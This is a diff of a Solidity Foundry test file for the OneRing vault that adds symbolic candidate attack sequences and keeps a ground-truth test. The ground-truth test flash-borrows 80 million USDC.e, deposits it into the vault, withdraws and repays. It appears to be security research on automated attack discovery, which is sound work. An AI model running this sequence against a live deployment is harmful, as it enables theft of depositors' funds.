@@ -294,15 +294,114 @@ contract OneRingTest is Test, BlockLoader {
         vault.withdraw(amount, address(usdce));
     }
 
+    function check_cand000(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_usdce_owner(amt0);
+        swap_pair_attacker_usdce_mim(amt1, amt2);
+        swap_pair_attacker_mim_usdce(amt3, amt4);
+        payback_usdce_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand001(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 >= amt0);
+        borrow_usdce_owner(amt0);
+        deposit_vault_usdce_vault(amt1);
+        withdraw_vault_vault_usdce(amt2);
+        payback_usdce_owner(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand002(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_mim_owner(amt0);
+        swap_pair_attacker_mim_usdce(amt1, amt2);
+        swap_pair_attacker_usdce_mim(amt3, amt4);
+        payback_mim_owner(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand003(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 >= amt0);
+        borrow_vault_owner(amt0);
+        withdraw_vault_vault_usdce(amt1);
+        deposit_vault_usdce_vault(amt2);
+        payback_vault_owner(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand004(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_usdce_pair(amt0);
+        swap_pair_attacker_usdce_mim(amt1, amt2);
+        swap_pair_attacker_mim_usdce(amt3, amt4);
+        payback_usdce_pair(amt5);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand005(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt3 >= amt0);
+        borrow_usdce_pair(amt0);
+        deposit_vault_usdce_vault(amt1);
+        withdraw_vault_vault_usdce(amt2);
+        payback_usdce_pair(amt3);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
     function test_gt() public {
         vm.startPrank(attacker);
         borrow_usdce_pair(80000000e6);
         printBalance("After step0 ");
         deposit_vault_usdce_vault(80000000e6);
         printBalance("After step1 ");
-        emit log_named_uint("getSharePrice2", vault.getSharePrice());
-        emit log_named_uint("investedBalanceInUSD", strategy.investedBalanceInUSD());
-        emit log_named_uint("totalSupply", vault.totalSupply());
         withdraw_vault_vault_usdce(vault.balanceOf(attacker));
         printBalance("After step2 ");
         payback_usdce_pair((80000000e6 * 1003) / 1000);
